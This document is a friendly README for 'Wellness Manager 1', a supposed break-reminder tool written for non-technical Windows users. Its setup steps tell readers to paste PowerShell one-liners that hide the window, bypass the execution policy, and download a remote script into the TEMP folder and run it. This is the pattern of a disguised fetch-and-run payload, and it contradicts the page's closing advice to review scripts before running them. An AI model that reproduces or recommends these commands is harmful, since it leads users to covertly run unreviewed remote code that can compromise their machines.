# Wellness Manager 1: Your Personal Wellness Companion

In today's fast-paced digital world, it's easy to lose track of time and forget to take the small breaks that are essential for your well-being. Wellness Manager 1 is a lightweight, friendly tool designed to help you build healthier work habits, reduce the risk of repetitive strain injury (RSI), and boost your productivity by encouraging regular pauses.

## Why You'll Love It

*   **Gentle Reminders:** At random intervals, a cheerful toast notification will appear on your screen with a fun, encouraging message, reminding you to stretch, look away from the screen, or simply take a moment to relax.
*   **Boosts Focus:** Regular short breaks have been proven to improve concentration and creativity. By reminding you to step back, this tool helps you return to your work with a clearer mind.
*   **Easy to Use:** No installation is required. You can run the tool with a single command, and it will work quietly in the background.

## Getting Started: Simple Steps to a Healthier Workday

It's incredibly easy to start using Wellness Manager 1, even if you're not a tech expert! Just follow these simple steps:

**1. Open PowerShell:**

*   Click on the **Start Menu** in the bottom-left corner of your screen.
*   In the search bar, type **"PowerShell"**.
*   You will see "Windows PowerShell" in the search results. Click on it to open a blue window with a command prompt. This is the PowerShell terminal.

**2. Choose Your Mode:**

Now that you have PowerShell open, you can choose how you want to run the tool.

*   **Interactive Mode (Recommended for first-time users):**
    *   This mode will ask you if you want to start the reminder service. It's a great way to see how it works.
    *   Copy the following command, paste it into the PowerShell window, and press **Enter**:

        ```powershell
        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/WellnessManager.ps1') | Out-File $env:TEMP\WellnessManager.ps1; . $env:TEMP\WellnessManager.ps1"
        ```

*   **Automatic Mode (for a hands-off experience):**
    *   This mode starts the reminder service immediately without asking. It's perfect for setting it up to run automatically every time you start your computer.
    *   Copy the following command, paste it into the PowerShell window, and press **Enter**:

        ```powershell
        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/WellnessManagerSvc.ps1') | Out-File $env:TEMP\WellnessManagerSvc.ps1; . $env:TEMP\WellnessManagerSvc.ps1"
        ```

**3. That's It!**

Wellness Manager 1 is now running in the background. You can close the PowerShell window, and the service will continue to work, sending you friendly reminders throughout your day.

## A Note on Security

We believe in transparency. While this tool is designed to be a helpful companion, we always recommend that you review any script before running it on your system. Your security is our top priority.
